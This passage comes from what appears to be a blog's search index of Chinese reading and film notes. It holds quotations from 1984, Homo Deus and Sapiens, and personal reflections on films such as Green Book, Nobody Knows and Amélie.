最基本的思维能力，他们只会专注于具体而琐碎的不平事，而那些更大的罪恶则无一例外地被忽略。</li><li>一切都蒙上了一层迷雾。过去被抹杀，抹杀的过程被遗忘，谎言变成了真相。</li><li>过去不仅被篡改，而且被不断篡改。像噩梦般让他备受煎熬的是自己从来没有弄明白为什么要进行这种大规模的伪造工作。篡改过去带来的好处立竿见影，但其终极目的却让人无从知晓。</li><li>自由就是拥有说二加二等于四的自由。若此前提成立，其他皆顺理成章。</li><li>他们就像蚂蚁，只看得见芝麻小事，却看不到大事。一旦记忆消失，书面记录又被篡改得面目全非，一旦这样的情况发生，就只能接受党所声称的人们的生活水准得到了很大的提高。因为检验这句话是否真实的标准没有了，而且再也不可能有了。</li><li>人体总是在需要它做出特别努力的时候变得瘫软无力。</li><li>他突然意识到，在危急时刻，人们斗争的对象从来就不是外部的敌人，而是自己的身体。</li><li>你说的每一句话，发出的每一个声响都会被监听；只要有一点光线，你的一举一动都会被监视。这便是生活，你身处其中，且无从选择。</li><li>在这个充斥着谎言的世界里，只有他捍卫着真理和理智。</li><li>过去尽管说是可以改变的，却从未被改变过。只要是真实的东西，就永远都是真实的。</li><li>知道的同时一无所知；无比诚实地说着精心编织的谎言；理所当然地同时持有两种观点，哪怕深知这两种观点互相矛盾，却仍然全盘接受；用逻辑驳斥逻辑；批驳道德的同时却又声称自己是道德的；相信民主不可能实现的同时相信党捍卫着民主；在应该忘记的时候忘记，在需要的时候再记起，接着又立即将其忘记，最重要的是，将方法运用于方法本身。这便是极微妙之处：有意识地将自己催眠，接着将刚才自我催眠这件事也忘掉。哪怕理解“双向思维”这个词，都要用到双向思维。</li><li>使得过去每一天，几乎每时每刻都与现在保持一致，通过这种方式，使得资料显示的党的每一项预测都是正确的，不允许任何与当下情形相违背的新闻报道和观点的记录存在。所有历史事件就像写在一张可以擦去重写的羊皮纸上。只要有这个必要，就会立刻把原文擦得一干二净，重新书写。因此只要这么做，就绝没有可能证明有错误的存在。</li><li>可什么又能表明这不该是世界应有的样子呢？如果根本没有任何久远的记忆显示世界曾经并非如此，又有什么理由感到无法忍受呢？</li><li>如果有希望，那么希望就在群众身上。</li><li>他们不觉悟，就永远不会反抗；而不反抗，他们就无法觉悟。</li><li>群众有着强烈的政治倾向并不是一件可取的事。他们只需具备最原始的爱国主义情感即可。这样，就能在需要时唤起这种情感，让他们接受更长的工作时间和更少的物资配给。哪怕他们变得有所不满——有时候他们的确会这样——他们的不满也不会导致任何结果。因为缺少最基本的思维能力，他们只会专注于具体而琐碎的不平事，而那些更大的罪恶则无一例外地被忽略。</li><li>一切都蒙上了一层迷雾。过去被抹杀，抹杀的过程被遗忘，谎言变成了真相。</li><li>过去不仅被篡改，而且被不断篡改。像噩梦般让他备受煎熬的是自己从来没有弄明白为什么要进行这种大规模的伪造工作。篡改过去带来的好处立竿见影，但其终极目的却让人无从知晓。</li><li>自由就是拥有说二加二等于四的自由。若此前提成立，其他皆顺理成章。</li><li>他们就像蚂蚁，只看得见芝麻小事，却看不到大事。一旦记忆消失，书面记录又被篡改得面目全非，一旦这样的情况发生，就只能接受党所声称的人们的生活水准得到了很大的提高。因为检验这句话是否真实的标准没有了，而且再也不可能有了。</li><li>人体总是在需要它做出特别努力的时候变得瘫软无力。</li><li>他突然意识到，在危急时刻，人们斗争的对象从来就不是外部的敌人，而是自己的身体。</li><li>如同逆水游泳，无论怎样用力都无法前进，但突然你就决定要顺流而下而非逆流而上了。只有你自己的态度变了，但命中注定的总会发生。</li><li>“疼痛并不总能发挥作用。有时，人类能忍住疼痛，甚至可以忍到死亡的那一刻。但所有人都无法忍受一件事——某种想都不敢想的东西。这与勇气或胆怯无关。从高处落下，抓住绳子并不是懦夫之举。从海底浮上来，大口呼吸空气也不是懦夫之举。那只是本能，无法毁掉的本能。老鼠也是一样，你忍不了老鼠。它们让你有无法承受的压力，就算你想承受也一样。</li></ol><h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>真的很触目惊心，看了这个和《动物庄园》，真的让人感慨，历史是必然的。</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《未来简史》 尤瓦尔·赫拉利</title>
      <link href="/2019/reading-note/%E3%80%8A%E6%9C%AA%E6%9D%A5%E7%AE%80%E5%8F%B2%E3%80%8B%20%E5%B0%A4%E7%93%A6%E5%B0%94%C2%B7%E8%B5%AB%E6%8B%89%E5%88%A9/"/>
      <url>/2019/reading-note/%E3%80%8A%E6%9C%AA%E6%9D%A5%E7%AE%80%E5%8F%B2%E3%80%8B%20%E5%B0%A4%E7%93%A6%E5%B0%94%C2%B7%E8%B5%AB%E6%8B%89%E5%88%A9/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E6%9C%AA%E6%9D%A5%E7%AE%80%E5%8F%B2%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><ol><li>衰老和死亡不过是许多特定问题的总和。  </li><li>凡人知道生也有涯，因此愿意冒险体验人生。  </li><li>科学在一次一次的葬礼中进步 —— 马克思·普朗克  </li><li>正是因为人们渴求永生不死，才能谱出“不朽”的交响曲，在战争中奋力争取“永恒的荣耀”，甚至愿意牺牲生命。  </li><li>幸福快乐的玻璃天花板有两大支柱，分别属于心理和生理层面。在心理层面，快乐与否取决于你的预期，而非客观条件。仅有和平繁荣的生活，并不能让我们满意；现实必须符合预期，才能让我们满足。但坏消息是，随着客观条件改善，预期也会不断膨胀。  </li><li>几千年来，科技、经济、社会和政治一直在发生着巨变，但有一件事始终未变：人类本身。现在人类拥有的工具和体制已经和《圣经》时代大有差异，但人类心灵的深层结构仍然相同。  </li><li>人们之所以不愿改变，是因为害怕未知。但历史唯一不变的事实，就是一切都会改变。  </li><li>我们可能觉得书面文字只是用来温和地描述现实，但他却逐渐变得威力无穷，因为它能够重塑现实。  </li><li>几乎没人在意真相，表格上写的反面才更重要。  </li><li>历史绝不是单一的叙事，而是同时有着成千上万种不同的叙事。我们选择讲叙其中一种叙事，就等于选择让其他叙事失声。  </li><li>怎么知道某个实体是否真实？答案很简单，只要问问自己，“它是否会觉得痛苦”，就行了。  </li><li>战争的起源是虚构的，但痛苦则百分之百的真实。  </li><li>常言道，“天助自助者”，这等于兜了个圈子告诉我们：根本没有上帝，但是信仰上帝能够激励我们自己去做某件事，并将之作为一种助力。  </li><li>宗教并不等于迷信，因为大多数人都不可能把自己最相信的事称为迷信。自己相信的，一定是“真理”，只有别人相信的，才是“迷信”。  </li><li>宗教由人创立，而非由神所创；宗教的定义应该在于其社会功能而不在于神是否存在。  </li><li>所有人类社会都有此类信仰。每个社会都会告诉其成员，他们必须服从于一些高于人类的道德法则，而如果俄日反这些法则，就会导致灾难。  </li><li>任何宗教的追随者，都相信只有自己的宗教才是真实的。  </li><li>我们说宗教是一种用来维护社会秩序、组织人类进行大规模合作的工具，这种说法可能会让某些人感到恼怒，因为对他们来说，宗教最重要的一点就是代表一条通往灵性的途径。然而，一方面，宗教和科学的差距比我们一般认为的更小；另一方面，宗教和灵性的差距却比我们想象的更大。宗教就是一份契约，而灵性是一个旅程。  </li><li>宗教要巩固世俗秩序，但灵性要逃离世俗秩序。  </li><li>佛教禅宗就曾说“逢佛杀佛”，讲的是在灵性的道路上，如果发现佛教已经落入僵化、固定的窠臼，就必须连这些一起摆脱。  </li><li>灵性之旅总是以悲剧收场，因为这是一条孤独的道路，只适合个人，而并不适合整个社会。  </li><li>随着时间的推移，科学的光明驱散了宗教的黑暗，世界越来越世俗、理性和繁荣。  </li><li>哈里斯认为，所有人的终极价值都是相同的——将痛苦最小化，快乐最大化。因此所有的伦理争论都是关于“如何将快乐最大化” 的事实论证。  </li><li>科学革命正产生于历史上最教条武断、最褊狭，也最具宗教色彩的社会。  </li><li>宗教最在乎的是秩序，科学最在乎的是力量。  </li><li>“无所不能”似乎唾手可得，但我们脚下却有一个完全虚无的深渊。  </li><li>信贷正是信任在经济上的表现。  </li><li>现代经济真正的敌人是生态崩溃。  </li><li>历史从无正义可言，每当灾难发生，就算这场悲剧实际上是由富人所引起的，但穷人承受的苦难总是远远大于富人。  </li><li>正是人文主义，让人类摆脱了人生无意义、存在无根据的困境。  </li><li>人文主义让我们认为，人类自己就是意义的本源。  </li><li>唯有从人的感觉出发，才有权判断人类的行为的真正意义。  </li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《绿皮书》</title>
      <link href="/2019/reading-note/%E3%80%8A%E7%BB%BF%E7%9A%AE%E4%B9%A6%E3%80%8B/"/>
      <url>/2019/reading-note/%E3%80%8A%E7%BB%BF%E7%9A%AE%E4%B9%A6%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E7%BB%BF%E7%9A%AE%E4%B9%A6%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><a id="more"></a>：  <ol><li>人之所以孤独是因为不敢迈出第一步。  </li><li>因为光有天分是不够的，改变人们的观念需要很大的勇气。  </li><li>不要问，你的国家能为你做些什么，问问你为自己做了什么。  </li></ol><h2 id="感受："><a href="#感受：" class="headerlink" title="感受："></a>感受：</h2><p>有些时候，只有你自己去体验过这种感觉，你才会真正明白，这种令人心痛、无奈、无法反抗的无力。<br>种族歧视是一直以来都存在的问题，即使到了9102年，你也不能否认。你敢说你看到黑人的第一印象就是好的么？这种深深印刻进血液里的东西，怎么能说没有就没有呢？<br>其实这部电影，在我看之前，我就已经被别人推荐+剧透了一波。不过光听别人讲与自己亲眼看的感觉是截然不同的。真的是看了电影才会体会到这种无法反抗社会的无力，是真的很无力，你想改变，但是无从下手。因为每个人都是这样的，乌合之众再确切不过了。<br>虽然由于道德层面，黑人的地位开始逐渐提高，但是这并没有什么巨大的改变。仍然有人会用世俗的眼光看待他们。<br>每次唐·雪利到一个地方演奏，总是会被歧视。住宿、吃饭、娱乐受尽耻辱，警官对待他也是能粗暴绝不温柔。  </p><p>PPS：影片里的炸鸡看起来好好吃。  </p>]]></content>
      
      
      <categories>
          
          <category> 观影笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 观影笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《何以为家》</title>
      <link href="/2019/reading-note/%E3%80%8A%E4%BD%95%E4%BB%A5%E4%B8%BA%E5%AE%B6%E3%80%8B/"/>
      <url>/2019/reading-note/%E3%80%8A%E4%BD%95%E4%BB%A5%E4%B8%BA%E5%AE%B6%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E4%BD%95%E4%BB%A5%E4%B8%BA%E5%AE%B6%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><a id="more"></a>：  <ol><li>我想让大人们都听一听我的话，我想让那些不能照顾孩子的人不要生孩子。  </li><li>生活简直就像一坨狗屎，比我脚上的鞋还脏。我天天活在地狱里，受着煎熬，就像我做梦都想吃鸡肉一样。  </li></ol><h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>真的好致郁啊，整部影片特别的压抑，让我中途就像放弃。小男孩最后说的几句话真的很好、很有道理。  </p>]]></content>
      
      
      <categories>
          
          <category> 观影笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 观影笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《人类简史》 尤瓦尔·赫拉利</title>
      <link href="/2019/reading-note/%E3%80%8A%E4%BA%BA%E7%B1%BB%E7%AE%80%E5%8F%B2%E3%80%8B%20%E5%B0%A4%E7%93%A6%E5%B0%94%C2%B7%E8%B5%AB%E6%8B%89%E5%88%A9/"/>
      <url>/2019/reading-note/%E3%80%8A%E4%BA%BA%E7%B1%BB%E7%AE%80%E5%8F%B2%E3%80%8B%20%E5%B0%A4%E7%93%A6%E5%B0%94%C2%B7%E8%B5%AB%E6%8B%89%E5%88%A9/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E4%BA%BA%E7%B1%BB%E7%AE%80%E5%8F%B2%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><ol><li>胜利几乎永远属于合作更顺畅的一方  </li><li>别人吃肉，那些冒着生命危险、在广场抗议的群众却只能喝汤，就是因为他们不知道如何合作建立一个高效的组织来维护自己的利益  </li><li>我们会拒绝不公平的方案，因为如果在石器时代，温和接受一切要求就只能等死  </li><li>只要智人住在相信同样一套故事的地方，就会遵守一样的规矩，于是不仅很容易预测陌生人会有什么行为，也很方便组织大规模合作的网络。  </li><li>但事实上，大多数人生活的意义，都只存在于彼此讲述的故事之中  </li><li>这正是历史展开的方式。人类编织出一张意义的网，并全然相信它，但这张网迟早都会拆散，直到我们回头一看，实在无法想象当时怎么可能有人真心相信这样的事情。  </li><li>在21世纪，历史和生物学的界限可能会变得模糊，但并非因为我们将发现如何用生物学来诠释历史事件，而是因为我们会因为意识形态的虚构故事而改写DNA链，为了政治和经济利益而改变气候，用网络空间来取代山川的地理环境。随着人类的种种虚构想想转译为基因和电子代码，互为主体的现实将会吞没客观现实，而使生物学与历史融合在一起。到了21世纪，虚构想象有可能成为世界上最强大的力量，甚至超越自然选择。因为，如果我们想了解人类的未来，只是破译基因组、处理各种数据数字还远远不够，我们还必须破解种种赋予世界意义的虚构想象  </li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《无人知晓》</title>
      <link href="/2019/reading-note/%E3%80%8A%E6%97%A0%E4%BA%BA%E7%9F%A5%E6%99%93%E3%80%8B/"/>
      <url>/2019/reading-note/%E3%80%8A%E6%97%A0%E4%BA%BA%E7%9F%A5%E6%99%93%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E6%97%A0%E4%BA%BA%E7%9F%A5%E6%99%93%E3%80%8B.jpg" alt="封面" loading="lazy"></p><a id="more"></a>  <h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>一开始看到这部电影的名字和日本，就联想的觉得是一部惊悚片（x），主要是我之前看过的一部小说《无人生还》，他俩名字超像就莫名其妙地有了代入感，看开头部分的时候，一直期待有啥奇怪的事情发生，我也是很自high的。但是，看到最后一秒钟的时候才打破了我的脑内幻想（捂脸）。<br>其实这部电影还是很不错的，它讲述的是一个单亲妈妈带着四个小孩子的故事，但其实最主要的故事应该是，一个12岁的大男孩带着三个妹妹弟弟如何艰难地存活下去。就像电影名字一样，无人知晓。没人知道他们的存在（除了与他们住的相近的人），但更重要的是没有人知道他们这么辛苦地生存。<br>妈妈，我从影片一开始就不是很喜欢，可能是因为她说话的声音有点点嗲。后来证明她确实是个渣女石锤了。从她透露出的信息可以知道，她跟许多男的有过不正当关系，甚至是同时，并且生下了那些孩子。我觉得她的想法应该是有了孩子就有了跟孩子父亲的羁绊了，就觉得能够让这个男人永远跟她一起。但是我猜测她是在还没结婚之前就急冲冲地准备好了。<br>但是在搬到新家后，她经常几个月不回家 ，后来索性消失了，还让明好好照顾大家，你到是打钱啊！！！不打钱，你说个啥！！假惺惺地样子真让人讨厌！<br>明确实是超级棒的一个孩子，虽然也有过不乖的时候，跟狐朋狗友一起偷商店里的东西，一起玩游戏。但是毕竟他身上扛了一个不应该是12岁小孩扛的担子，有时候放松、发泄一下也无可厚非。我觉得明超级重感情，明明可以向警察求助，却因为这样四个人就不能在一起了而自己硬抗起这个家。后来小雪死了，他疯狂的向妈妈打电话，求助，花完了所有的硬币，却只换来一阵忙音，和第二天早上一封“明，一定要照顾好大家，妈妈相信你哦”的信，当时看的我的心都拔凉拔凉的。明，得有多无助，多绝望。他最后决定求助于之前一起玩耍过的初中生，他们俩一起将小雪放在旅行箱里，带小雪去看飞机，那是小雪的愿望。最后一起将小雪埋在了那里。<br>他们回去后，继续之前的生活，影片以他们一起回家的背影为结束，无人知晓他们的结局如何，也许在那个大女孩的帮助下，成功的活过来了，然后去工作，挣钱，遇到自己喜欢的人，结婚，生孩子，好好地非常疼爱地对待自己的孩子。也许去找过妈妈，质问她为什么要这样对待他们。也许妈妈早已活不下去了，被男人抛弃。也许有很多，开放性的结尾，给我们很多关于未来的想象。<br>看完这部电影，确实有些压抑。<br>感觉这部片子控诉的和之前《何以为家》比较相像，都是一个小孩子带着另一个更小的小孩子在艰难的生活中顽强地生存，像一朵野花，即使面对的是狂风骤雨，也想要绽放，成就一生最美丽的时刻。  </p>]]></content>
      
      
      <categories>
          
          <category> 观影笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 观影笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《爱伦坡小说集》 爱伦坡</title>
      <link href="/2019/reading-note/%E3%80%8A%E7%88%B1%E4%BC%A6%E5%9D%A1%E5%B0%8F%E8%AF%B4%E9%9B%86%20%E3%80%8B%20%E7%88%B1%E4%BC%A6%E5%9D%A1/"/>
      <url>/2019/reading-note/%E3%80%8A%E7%88%B1%E4%BC%A6%E5%9D%A1%E5%B0%8F%E8%AF%B4%E9%9B%86%20%E3%80%8B%20%E7%88%B1%E4%BC%A6%E5%9D%A1/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E7%88%B1%E4%BC%A6%E5%9D%A1%E5%B0%8F%E8%AF%B4%E9%9B%86%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="《眼睛》"><a href="#《眼睛》" class="headerlink" title="《眼睛》"></a>《眼睛》</h2><h3 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h3><a id="more"></a><ol><li>最辉煌、最持久的心之镣铐都是在一瞥之间被钉牢的。</li><li>我的爱称作是一时糊涂，是磷火的闪现，是片刻的遐思，或者说是悬想。</li></ol><p>#</p><h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>这应该主要是讽刺了不带眼镜，故作姿态的人。从太外祖母变成妻子的刺激真的特别强烈，看完真的忍不住为爱伦坡大大鼓掌 ，真的是，没话说，一下子将前面所有都颠覆了，不过好在结局还很不错hhhh。<br>主要就是传递一个要正视自己缺点的道理，就算带着眼镜很丑，但毕竟他是必需的，就不能因此不去带。</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《驯龙高手》</title>
      <link href="/2019/reading-note/%E3%80%8A%E9%A9%AF%E9%BE%99%E9%AB%98%E6%89%8B%E3%80%8B/"/>
      <url>/2019/reading-note/%E3%80%8A%E9%A9%AF%E9%BE%99%E9%AB%98%E6%89%8B%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E9%A9%AF%E9%BE%99%E9%AB%98%E6%89%8B%E3%80%8B.jpg" alt="封面" loading="lazy"></p><a id="more"></a>  <h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><ol><li>相信我，谈恋爱只会给人带来痛苦。  </li><li>我爱你，但我更希望你自由。  </li></ol><h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>很久之前就看过这个系列电影的1/2部，当时觉得就是超级棒，所以在前天就看了这部新电影，看完之后知道，这个系列结束了。套路还是套路，并不出新，但是很满足情怀。<br>一开始看这个系列的时候，就觉得有头超牛逼的龙好酷啊，完完全全就是废柴男主重生记。emmm，还意外地挺好看。男主很软弱的这个性格一直都没有改变，虽然女主一直一直鼓励他，支持他，理解他。也有妈妈的助攻（XD）。男主真的人生赢家啊。<br>再说说夜煞，怎么说呢，他向光煞求爱的时候，真的秒变二哈，当时看的我真的笑死了，总之，我认识到了小动物发情时的疯狂表现，好恐怖。hhhh<br>画面真的到了隐秘之境的时候超级美，超级绚丽。非常符合人们对于那个地方的想。 也jio得有点点俗套了。不过反正是动画片，又是满足情怀的，没有特别的雷人，无聊也就还行。<br>不过这部电影也有超级让我感动的地方，就是小嗝嗝放开光煞让他去救已经被毒药毒晕的夜煞，而让自己身处绝境，与大反派单挑。save him。这句话出来的时候差点泪崩。QAQ<br>哎，就这样吧  </p>]]></content>
      
      
      <categories>
          
          <category> 观影笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 观影笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《天使爱美丽》</title>
      <link href="/2019/reading-note/%E3%80%8A%E5%A4%A9%E4%BD%BF%E7%88%B1%E7%BE%8E%E4%B8%BD%E3%80%8B/"/>
      <url>/2019/reading-note/%E3%80%8A%E5%A4%A9%E4%BD%BF%E7%88%B1%E7%BE%8E%E4%B8%BD%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E5%A4%A9%E4%BD%BF%E7%88%B1%E7%BE%8E%E4%B8%BD%E3%80%8B.jpg" alt="封面" loading="lazy"></p><a id="more"></a>  <h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><ol><li>小艾米丽，你不是脆弱的玻璃人，幸福要靠自己争取，假如你错过机会，你那颗心迟早会像我的骨头那样，又干又枯，别再犹豫，去找他吧。  </li><li>失意作家说，失意让我们明白了人生是永远打不完的草稿，就是一出一直在排练却从来不会真正上演的戏剧  </li></ol><h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>一开始觉得这种氛围微微地透露出一点诡异，我还有点点害怕。艾米丽成长的环境真的有点点糟糕，但这也让小艾米丽拥有丰富的想象力，经常会幻想，进行一些很惊喜的小恶作剧。<br>说说她的童年吧，被爸爸诊断出有心脏病，因此只能在家学习，不能认识新的朋友，不能与同龄的小伙伴一起玩耍，能在她旁边的只有她的父母。而且妈妈还有点精神衰弱，一种很可悲的环境。但艾米丽还是很勇敢，拥有自己的快乐和原则，是一个很有趣的灵魂。<br>她会去尝试很多东西，sex，捉弄别人，安慰别人，撮合一对人，去寻找自己的正义，帮助需要的人。<br>她活的很充实，我感觉的。体会过人生百态，经历过不开心的时候。比如怀孕后被迫堕胎，影片里只是轻描淡写地过去了，艾米丽依旧是一副开心的表情，仿佛并没有发生在她身上。她的乐观，从容令我佩服。<br>艾米丽的人物形象另我惊艳，我本以为生长在这种环境下，甚至目睹了妈妈的死亡的小艾米丽会不愿意去接触外界，只一味地躲在自己的小小幻想世界里。但她竟然还能有个开放的心态，愿意去接纳别人，敞开自己心怀。<br>影片中的死物，比如照片，挂在墙上的画和台灯上装饰的猪猪，都活了过来，很贴心的关心自己的主人。当我看见那个尼诺也拥有这种幻想的时候，我就知道，他们是一对，定了！<br>看到结局，玻璃老人跟小艾米丽说了那些话后，艾米丽夺门而出，却撞见了心爱的那个人，真的超级法国了。<br>总之剧情有些欢脱，有些惊悚，有些很sex，有些也很恶俗。但是我并不讨厌，有过惊吓，也有过开心。很值得品味<br>这部电影适合自己一个人，拿着一杯茶，在躺椅上享受。因为，跟别人一起看会很害羞的。难道说是我还太保守了？？？我觉得有些情节真的很奇怪？？？<br>哎，不管了。  </p>]]></content>
      
      
      <categories>
          
          <category> 观影笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 观影笔记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
